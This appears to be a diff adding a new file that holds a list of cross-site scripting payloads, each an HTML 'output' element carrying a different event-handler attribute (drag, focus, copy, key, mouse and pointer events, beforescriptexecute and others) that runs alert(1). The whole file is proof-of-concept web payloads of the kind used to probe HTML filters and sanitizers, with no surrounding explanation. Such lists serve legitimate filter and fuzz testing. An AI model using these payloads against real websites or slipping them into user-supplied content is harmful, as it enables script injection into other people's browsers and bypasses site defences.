@@ -1,0 +1,43 @@
+<output draggable="true" ondrag="alert(1)">test</output>
+<output draggable="true" ondragend="alert(1)">test</output>
+<output draggable="true" ondragenter="alert(1)">test</output>
+<output draggable="true" ondragleave="alert(1)">test</output>
+<output draggable="true" ondragstart="alert(1)">test</output>
+<output id=x tabindex=1 onactivate=alert(1)></output>
+<output id=x tabindex=1 onbeforeactivate=alert(1)></output>
+<output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>
+<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>
+<output id=x tabindex=1 onfocus=alert(1)></output>
+<output id=x tabindex=1 onfocusin=alert(1)></output>
+<output onafterscriptexecute=alert(1)><script>1</script>
+<output onbeforecopy="alert(1)" contenteditable>test</output>
+<output onbeforecut="alert(1)" contenteditable>test</output>
+<output onbeforepaste="alert(1)" contenteditable>test</output>
+<output onbeforescriptexecute=alert(1)><script>1</script>
+<output onblur=alert(1) tabindex=1 id=x></output><input autofocus>
+<output onclick="alert(1)">test</output>
+<output oncontextmenu="alert(1)">test</output>
+<output oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<output oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<output ondblclick="alert(1)" autofocus tabindex=1>test</output>
+<output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>
+<output onkeydown="alert(1)" contenteditable>test</output>
+<output onkeypress="alert(1)" contenteditable>test</output>
+<output onkeyup="alert(1)" contenteditable>test</output>
+<output onmousedown="alert(1)">test</output>
+<output onmouseenter="alert(1)">test</output>
+<output onmouseleave="alert(1)">test</output>
+<output onmousemove="alert(1)">test</output>
+<output onmouseout="alert(1)">test</output>
+<output onmouseover="alert(1)">test</output>
+<output onmouseup="alert(1)">test</output>
+<output onmousewheel=alert(1)>requires scrolling
+<output onpaste="alert(1)" contenteditable>test</output>
+<output onpointerdown=alert(1)>XSS</output>
+<output onpointerenter=alert(1)>XSS</output>
+<output onpointerleave=alert(1)>XSS</output>
+<output onpointermove=alert(1)>XSS</output>
+<output onpointerout=alert(1)>XSS</output>
+<output onpointerover=alert(1)>XSS</output>
+<output onpointerrawupdate=alert(1)>XSS</output>
+<output onpointerup=alert(1)>XSS</output>
